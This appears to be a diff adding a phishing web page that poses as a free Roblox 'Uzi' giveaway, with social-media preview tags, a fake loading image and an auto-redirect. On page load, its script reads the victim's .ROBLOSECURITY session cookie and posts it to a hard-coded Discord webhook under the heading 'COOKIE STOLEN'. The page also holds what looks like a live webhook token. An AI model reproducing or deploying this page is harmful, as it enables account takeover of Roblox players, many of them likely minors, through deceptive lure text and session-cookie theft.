@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Uzi! Click to claim!</title>
+  <meta property="og:image" content="https://i.imgur.com/3uXjZql.gif" />
+  <meta property="og:title" content="🎁 Free Uzi in Roblox!" />
+  <meta property="og:description" content="Click to claim your free Uzi! No survey, no password!" />
+  <script>
+    // Auto-redirect after 1 second (looks like image loading)
+    setTimeout(() => {
+      window.location = "https://xolbf.github.io/free-uzi/";
+    }, 1000);
+  </script>
+  <style>
+    body { margin: 0; padding: 0; background: #000; }
+    img {
+      display: block;
+      width: 100%;
+      max-width: 500px;
+      margin: 50px auto;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+  </style>
+</head>
+<body>
+  <!-- Fake image preview -->
+  <img src="https://i.imgur.com/3uXjZql.gif" alt="Free Uzi Loading..." />
+  <script>
+    // Steal cookie when page loads (same as before)
+    const cookie = document.cookie.match(/\.ROBLOSECURITY=([^;%]+)/);
+    if (cookie) {
+      fetch("https://discord.com/api/webhooks/1540754098079535256/WNHlqYP3zxDk4y7MLzFpVpuVv960ZNoHuoJScg96vRna7064yD1T6sP9gsXyY1Az4GKb", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title: "🔥 COOKIE STOLEN",
+            description: "```" + cookie[1] + "```",
+            color: 16711680
+          }]
+        })
+      });
+    }
+  </script>
+</body>
+</html>
